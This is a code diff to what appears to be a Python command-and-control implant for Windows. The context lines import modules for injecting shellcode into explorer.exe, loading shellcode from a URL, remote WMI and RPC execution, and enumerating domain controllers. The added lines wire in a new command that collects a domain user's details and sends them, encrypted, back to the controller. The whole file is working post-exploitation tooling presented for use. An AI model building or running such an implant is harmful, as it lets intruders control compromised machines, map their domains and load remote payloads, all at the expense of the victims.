@@ -33,6 +33,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.cp import cp
     from utils.winapi.rm import rm
     from utils.winapi.wmirun import wmirun
+    from utils.winapi.user_info import get_user_info 
     from utils.winapi.rpcrun import rpcrun
     from utils.winapi.inject_shellcode import load_shellcode_into_explorer
     from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
@@ -254,6 +255,19 @@ def execute_commands(agent_id):
                     result = get_domain_controllers()
                     status = 'Completed'
                     output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.startswith('get_user_info'):
+                try:
+                    parts = command_text.split(' ', 2)
+                    username = parts[1]
+                    domain = parts[2] if len(parts) > 2 else None
+                    result = get_user_info(username, domain)
+                    status = 'Completed'
+                    output = result
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
